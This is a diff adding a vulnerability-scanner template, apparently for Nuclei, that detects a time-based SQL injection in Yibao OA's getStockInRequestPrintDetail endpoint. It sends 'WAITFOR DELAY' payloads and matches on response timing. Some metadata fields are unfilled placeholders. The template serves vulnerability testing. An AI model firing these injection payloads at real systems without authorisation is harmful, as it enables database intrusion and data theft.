@@ -1,0 +1,24 @@
+id: yibaooa-getStockInRequestPrintDetail-sqli
+
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 易宝OA getStockInRequestPrintDetail SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:3%27--"
+      - "{{BaseURL}}/SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:6%27--"
+      - "{{BaseURL}}/SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:9%27--"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
